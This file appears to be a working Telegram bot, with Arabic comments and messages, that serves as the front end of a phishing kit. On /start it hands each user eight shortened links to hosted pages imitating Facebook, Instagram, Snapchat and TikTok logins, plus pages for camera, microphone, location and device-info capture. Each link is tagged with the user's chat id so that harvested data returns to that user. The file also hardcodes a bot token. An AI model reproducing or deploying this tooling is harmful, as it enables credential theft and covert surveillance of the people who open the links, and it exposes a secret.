import telebot
import requests
from flask import Flask
from threading import Thread
import os
import logging
import time

# كتم التنبيهات الحمراء المزعجة
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask('')
@app.route('/')
def home():
    return "M.Y.9 System is Online"

def run():
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = Thread(target=run)
    t.start()

# --- إعدادات البوت والتوكن ---
TOKEN = '8386427321:AAFKq8fCsoPEDgcF8KNFR2NUr7Gh0DwfskE'
bot = telebot.TeleBot(TOKEN)

# حل مشكلة الـ Conflict 409 وتنظيف الـ Webhook
bot.remove_webhook()
time.sleep(1)

def short_link(url):
    try:
        res = requests.get(f"https://is.gd/create.php?format=simple&url={url}", timeout=5)
        return res.text if res.status_code == 200 else url
    except:
        return url

@bot.message_handler(commands=['start'])
def send_welcome(message):
    uid = message.chat.id
    first_name = message.from_user.first_name
    hunter = first_name.replace(" ", "_")
    
    # رابط الـ GitHub Pages الأساسي تبعك
    base = "https://m-y-9-tech.github.io/fb/" 
    
    # الروابط الـ 8 المطلوبة بلمسة جيل 2009
    links = {
        "fb": short_link(f"{base}fb.html?id={uid}&hunter={hunter}"),
        "ig": short_link(f"{base}ig.html?id={uid}&hunter={hunter}"),
        "snap": short_link(f"{base}snap.html?id={uid}&hunter={hunter}"),
        "tik": short_link(f"{base}tiktok.html?id={uid}&hunter={hunter}"),
        "cam": short_link(f"{base}cam.html?id={uid}&hunter={hunter}"),
        "mic": short_link(f"{base}mic.html?id={uid}&hunter={hunter}"),
        "loc": short_link(f"{base}loc.html?id={uid}&hunter={hunter}"),
        "sys": short_link(f"{base}sys.html?id={uid}&hunter={hunter}")
    }

    msg = f"""
🚀 نـ^ـظـ^ـام M.Y.9 الـ^ـمـ^ـطـ^ـور | أهلاً بك {first_name}

👤 Dev: 𝔸𝕓𝕦 𝕊𝕒𝕟𝕒𝕕 𝕄𝕒𝕝𝕜𝕒𝕨𝕚
🔴 Instagram: https://www.instagram.com/m_y_.9/?hl=ar#

▬▬▬▬▬▬▬▬▬▬▬▬▬▬
💎 الأدوات الـ^ـمـ^ـفـ^ـعـ^ـلـ^ـة (جيل 2009) 💎
▬▬▬▬▬▬▬▬▬▬▬▬▬▬
🔹 فيـ^ـسبـ^ـوك 🔐: `{links['fb']}`
🔹 انـ^ـستـ^ـقـ^ـرام 🛡️: `{links['ig']}`
🔹 سـ^ـنـ^ـاب شـ^ـات 👻: `{links['snap']}`
🔹 تـيـك تـوك 🎵: `{links['tik']}`
🔹 الكـ^ـامـ^ـيـ^ـرا 📸: `{links['cam']}`
🔹 تـسـجـيـل الـصـوت 🎤: `{links['mic']}`
🔹 تـحـديـد المـ^ـوقـ^ـع 📍: `{links['loc']}`
🔹 مـ^ـعـ^ـلـ^ـومـ^ـات الـ^ـجـ^ـهـ^ـاز 📱: `{links['sys']}`
▬▬▬▬▬▬▬▬▬▬▬▬▬▬
⚙️ الـ^ـحـ^ـالـ^ـة: مـ^ـتـ^ـصـ^ـل..
    """
    bot.send_message(uid, msg, parse_mode="Markdown", disable_web_page_preview=True)

if __name__ == "__main__":
    keep_alive()
    print("🚀 M.Y.9 System is LIVE now!")
    bot.infinity_polling(timeout=20, long_polling_timeout=10)
